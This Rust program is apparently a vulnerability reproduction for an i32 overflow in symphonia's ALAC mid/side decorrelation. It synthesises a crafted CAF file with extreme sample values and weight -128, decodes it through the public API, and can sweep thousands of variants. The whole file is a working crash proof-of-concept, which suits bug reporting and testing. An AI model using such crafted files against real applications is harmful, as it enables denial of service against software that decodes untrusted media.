// Repro for candidate 029: i32 arithmetic overflow in symphonia-codec-alac's
// `decorrelate_mid_side` (symphonia-codec-alac/src/lib.rs:668).
//
// Run with no arguments for the headline reproduction: it builds a real, complete Core Audio
// Format (.caf) file holding a single, entirely ordinary-looking 24-bit stereo ALAC track, writes
// it to disk, and then decodes it through symphonia's real public entry points exactly the way any
// application would:
//
//     File -> MediaSourceStream -> symphonia::default::get_probe().probe(..)
//          -> CafReader (format) -> symphonia::default::get_codecs().make_audio_decoder(..)
//          -> decoder.decode(packet)
//
// Nothing internal/private is touched and no decoder state is hand-constructed: the only
// hand-authored thing is the malformed *file*, which is exactly the external artifact a real
// attacker/user supplies.
//
// The only unusual thing in the file is inside the ALAC bitstream: the channel pair element's
// `mid_side_weight` field is -128 and both channels' residuals are escaped rice codes that decode
// to exactly -2^24 (the most negative sample a 25-bit coded sample can legally hold). The decoder
// then evaluates `*s1 * weight` = -16777216 * -128 = 2147483648 > i32::MAX with plain (non-
// wrapping, non-checked) i32 arithmetic.
//
// Run with `--sweep` for the same-bug-class variation check: several thousand further CAF/ALAC
// streams covering every mid_side_shift, a range of bit depths, element shifts, weights and
// extreme sample pairs, all decoded through the same real public path. Every one of them must
// either decode or return a graceful decode error - none may panic.

use std::fs::File;
use std::io::{Cursor, Write};

use symphonia::core::codecs::audio::AudioDecoderOptions;
use symphonia::core::formats::probe::Hint;
use symphonia::core::formats::{FormatOptions, TrackType};
use symphonia::core::io::MediaSourceStream;
use symphonia::core::meta::MetadataOptions;

const SAMPLE_RATE: u32 = 44100;

/// Parameters of the CAF/ALAC stream to synthesize.
#[derive(Clone, Copy, Debug)]
struct Stream {
    /// ALAC magic cookie `bitDepth`.
    bit_depth: u8,
    /// ALAC magic cookie `frameLength` (also CAF frames-per-packet).
    frame_length: u32,
    /// Element bit-shift, in bytes (0..=2). The low `8 * shift_bytes` bits of every sample are
    /// then carried as separate "tail" bits.
    shift_bytes: u32,
    /// Element `mid_side_shift`.
    mid_side_shift: u8,
    /// Element `mid_side_weight` (as the raw 8-bit field, interpreted as i8 by the decoder).
    mid_side_weight: u8,
    /// The decoded residual value to force for channel 0's samples.
    sample0: i32,
    /// The decoded residual value to force for channel 1's samples.
    sample1: i32,
}

/// Most-significant-bit-first bit writer, for assembling the ALAC element bitstream.
struct BitWriter {
    buf: Vec<u8>,
    acc: u8,
    n: u32,
}

impl BitWriter {
    fn new() -> Self {
        BitWriter { buf: Vec::new(), acc: 0, n: 0 }
    }

    fn put(&mut self, val: u64, bits: u32) {
        for i in (0..bits).rev() {
            self.acc = (self.acc << 1) | (((val >> i) & 1) as u8);
            self.n += 1;
            if self.n == 8 {
                self.buf.push(self.acc);
                self.acc = 0;
                self.n = 0;
            }
        }
    }

    fn finish(mut self) -> Vec<u8> {
        if self.n > 0 {
            self.acc <<= 8 - self.n;
            self.buf.push(self.acc);
        }
        self.buf
    }
}

/// The 24-byte ALAC "magic cookie" (ALACSpecificConfig), stored in the CAF `kuki` chunk.
fn magic_cookie(s: &Stream) -> Vec<u8> {
    let mut c = Vec::new();
    c.extend_from_slice(&s.frame_length.to_be_bytes()); // frameLength
    c.push(0); // compatibleVersion
    c.push(s.bit_depth); // bitDepth
    c.push(40); // pb
    c.push(10); // mb
    c.push(14); // kb
    c.push(2); // numChannels (stereo)
    c.extend_from_slice(&255u16.to_be_bytes()); // maxRun
    c.extend_from_slice(&0u32.to_be_bytes()); // maxFrameBytes
    c.extend_from_slice(&0u32.to_be_bytes()); // avgBitRate
    c.extend_from_slice(&SAMPLE_RATE.to_be_bytes()); // sampleRate
    assert_eq!(c.len(), 24);
    c
}

/// Encodes `sample` as an escaped ("prefix > 8") rice code, which the decoder reads as a raw
/// `bps`-bit unsigned value and then maps to a signed sample with
/// `(val >> 1) ^ -(val & 1)`. Inverting that mapping gives the value to write.
fn put_escaped_sample(w: &mut BitWriter, sample: i32, bps: u32) {
    let val = if sample >= 0 { 2 * i64::from(sample) } else { -2 * i64::from(sample) - 1 } as u64;
    assert!(val < (1u64 << bps), "sample {sample} does not fit in {bps} coded bits");
    w.put(0x1ff, 9); // nine 1 bits: the rice escape prefix
    w.put(val, bps);
}

/// One ALAC packet: a channel pair element followed by the frame-end element.
fn alac_packet(s: &Stream) -> Vec<u8> {
    // Bits per coded sample for a channel pair element: bit_depth - shift + 1.
    let bps = u32::from(s.bit_depth) - 8 * s.shift_bytes + 1;

    let mut w = BitWriter::new();
    w.put(1, 3); // element tag: CPE
    w.put(0, 4); // element instance tag
    w.put(0, 12); // unused header bits (must be 0)
    w.put(0, 1); // is_partial_frame = false
    w.put(u64::from(s.shift_bytes), 2); // shift / 8
    w.put(0, 1); // is_uncompressed = false
    w.put(u64::from(s.mid_side_shift), 8); // mid_side_shift
    w.put(u64::from(s.mid_side_weight), 8); // mid_side_weight

    // Two channel element headers: mode=0, shift=0, pb_factor=0, lpc_order=0 (no prediction).
    w.put(0, 16);
    w.put(0, 16);

    // The "tail" bits, interleaved per frame, present only when the element has a bit-shift.
    for _ in 0..(2 * s.frame_length) {
        w.put(u64::from(u32::MAX), 8 * s.shift_bytes);
    }

    // Residuals: channel 0 first, then channel 1.
    for _ in 0..s.frame_length {
        put_escaped_sample(&mut w, s.sample0, bps);
    }
    for _ in 0..s.frame_length {
        put_escaped_sample(&mut w, s.sample1, bps);
    }

    w.put(7, 3); // element tag: END
    w.finish()
}

fn push_chunk(file: &mut Vec<u8>, id: &[u8; 4], body: &[u8]) {
    file.extend_from_slice(id);
    file.extend_from_slice(&(body.len() as i64).to_be_bytes());
    file.extend_from_slice(body);
}

/// Wraps one ALAC packet in a complete, valid CAF container.
fn caf_file(s: &Stream, packet: &[u8]) -> Vec<u8> {
    let mut f = Vec::new();

    // CAF file header.
    f.extend_from_slice(b"caff");
    f.extend_from_slice(&1u16.to_be_bytes()); // file version
    f.extend_from_slice(&0u16.to_be_bytes()); // file flags

    // Audio description chunk.
    let mut desc = Vec::new();
    desc.extend_from_slice(&f64::from(SAMPLE_RATE).to_be_bytes());
    desc.extend_from_slice(b"alac");
    desc.extend_from_slice(&0u32.to_be_bytes()); // format flags
    desc.extend_from_slice(&0u32.to_be_bytes()); // bytes per packet (variable)
    desc.extend_from_slice(&s.frame_length.to_be_bytes()); // frames per packet
    desc.extend_from_slice(&2u32.to_be_bytes()); // channels per frame
    desc.extend_from_slice(&u32::from(s.bit_depth).to_be_bytes()); // bits per channel
    push_chunk(&mut f, b"desc", &desc);

    // Magic cookie chunk (the ALAC codec-specific config).
    push_chunk(&mut f, b"kuki", &magic_cookie(s));

    // Packet table chunk: one variable-size packet.
    let mut pakt = Vec::new();
    pakt.extend_from_slice(&1i64.to_be_bytes()); // number of packets
    pakt.extend_from_slice(&i64::from(s.frame_length).to_be_bytes()); // valid frames
    pakt.extend_from_slice(&0i32.to_be_bytes()); // priming frames
    pakt.extend_from_slice(&0i32.to_be_bytes()); // remainder frames
    pakt.extend_from_slice(&variable_length_integer(packet.len() as u64));
    push_chunk(&mut f, b"pakt", &pakt);

    // Audio data chunk (must be last: the reader seeks back to it once it hits EOF).
    let mut data = Vec::new();
    data.extend_from_slice(&0u32.to_be_bytes()); // edit count
    data.extend_from_slice(packet);
    push_chunk(&mut f, b"data", &data);

    f
}

/// CAF packet-table variable-length integer encoding (7 bits per byte, MSB set to continue).
fn variable_length_integer(mut val: u64) -> Vec<u8> {
    let mut out = vec![(val & 0x7f) as u8];
    val >>= 7;
    while val > 0 {
        out.insert(0, 0x80 | (val & 0x7f) as u8);
        val >>= 7;
    }
    out
}

/// Decodes a CAF byte stream through symphonia's real public probe + decoder path, the same way
/// any application would. Returns the number of frames decoded, or the decode error message.
fn decode(caf: Vec<u8>) -> Result<u64, String> {
    let mss = MediaSourceStream::new(Box::new(Cursor::new(caf)), Default::default());

    let mut hint = Hint::new();
    hint.with_extension("caf");

    let mut format = symphonia::default::get_probe()
        .probe(&hint, mss, FormatOptions::default(), MetadataOptions::default())
        .map_err(|e| format!("probe: {e}"))?;

    let track = format.default_track(TrackType::Audio).expect("no audio track");
    let track_id = track.id;
    let audio_params = track
        .codec_params
        .as_ref()
        .expect("no codec parameters")
        .audio()
        .expect("not an audio codec")
        .clone();

    let mut decoder = symphonia::default::get_codecs()
        .make_audio_decoder(&audio_params, &AudioDecoderOptions::default())
        .map_err(|e| format!("make_audio_decoder: {e}"))?;

    let mut frames = 0;
    while let Some(pkt) = format.next_packet().map_err(|e| format!("demux: {e}"))? {
        if pkt.track_id != track_id {
            continue;
        }
        frames += decoder.decode(&pkt).map_err(|e| format!("decode: {e}"))?.frames() as u64;
    }

    Ok(frames)
}

/// The headline case: a real .caf file on disk, opened and decoded via the public API.
fn headline() {
    let stream = Stream {
        bit_depth: 24,
        frame_length: 4,
        shift_bytes: 0,
        mid_side_shift: 0,
        mid_side_weight: 0x80, // -128
        sample0: -(1 << 24),   // -16777216, the most negative 25-bit coded sample
        sample1: -(1 << 24),
    };

    let packet = alac_packet(&stream);
    let caf = caf_file(&stream, &packet);

    let path = std::env::temp_dir().join("symphonia_alac_mid_side_overflow.caf");
    File::create(&path).unwrap().write_all(&caf).unwrap();

    println!(
        "wrote {} ({} bytes): 24-bit stereo ALAC in CAF, {} byte ALAC packet, \
         mid_side_weight=-128, samples=-2^24",
        path.display(),
        caf.len(),
        packet.len()
    );

    let src = File::open(&path).expect("failed to open the file just written");
    let mss = MediaSourceStream::new(Box::new(src), Default::default());

    let mut hint = Hint::new();
    hint.with_extension("caf");

    let mut format = symphonia::default::get_probe()
        .probe(&hint, mss, FormatOptions::default(), MetadataOptions::default())
        .expect("probe failed");

    let track = format.default_track(TrackType::Audio).expect("no audio track");
    let track_id = track.id;
    let audio_params = track
        .codec_params
        .as_ref()
        .expect("no codec parameters")
        .audio()
        .expect("not an audio codec")
        .clone();

    println!("probed: caf container, alac track {track_id}");

    let mut decoder = symphonia::default::get_codecs()
        .make_audio_decoder(&audio_params, &AudioDecoderOptions::default())
        .expect("failed to make the ALAC decoder");

    let mut packets = 0;
    while let Some(pkt) = format.next_packet().expect("demux failed") {
        if pkt.track_id != track_id {
            continue;
        }
        packets += 1;
        println!("decoding packet {} ({} bytes)...", packets, pkt.data.len());
        match decoder.decode(&pkt) {
            Ok(buf) => println!("  decoded {} frames", buf.frames()),
            Err(e) => println!("  decode error (handled gracefully): {e}"),
        }
    }

    println!("finished: {packets} packet(s) decoded, no panic");
}

/// Same-bug-class variation check (CONFIRMATION.md section 7): sweep the whole
/// mid_side_shift/weight/bit-depth/extreme-sample space through the same real public path.
fn sweep() {
    let mut total = 0u32;
    let mut decoded = 0u32;
    let mut errors = 0u32;

    for bit_depth in [16u8, 20, 24, 28, 31, 32] {
        for shift_bytes in 0..=2u32 {
            if 8 * shift_bytes >= u32::from(bit_depth) {
                continue;
            }

            let bps = u32::from(bit_depth) - 8 * shift_bytes + 1;
            if bps > 32 {
                continue;
            }

            // The extremes of the coded sample range, plus a couple of interior values.
            let max = ((1i64 << (bps - 1)) - 1) as i32;
            let min = -(1i64 << (bps - 1)) as i32;
            let samples = [min, max, min + 1, max - 1, 0, -1, 1];

            for mid_side_shift in 0..=31u8 {
                for mid_side_weight in [0x80u8, 0x81, 0xff, 0x01, 0x7f] {
                    for (i, &sample0) in samples.iter().enumerate() {
                        // Pair every sample with every other one, rotated, to cover mixed signs.
                        let sample1 = samples[(i + 1) % samples.len()];

                        let stream = Stream {
                            bit_depth,
                            frame_length: 4,
                            shift_bytes,
                            mid_side_shift,
                            mid_side_weight,
                            sample0,
                            sample1,
                        };

                        let packet = alac_packet(&stream);
                        let caf = caf_file(&stream, &packet);

                        total += 1;
                        match decode(caf) {
                            Ok(_) => decoded += 1,
                            Err(_) => errors += 1,
                        }
                    }
                }
            }
        }
    }

    println!(
        "sweep: {total} streams decoded through the real public path \
         ({decoded} decoded, {errors} graceful decode errors), no panic"
    );
}

fn main() {
    if std::env::args().any(|a| a == "--sweep") {
        sweep();
    }
    else {
        headline();
    }
}
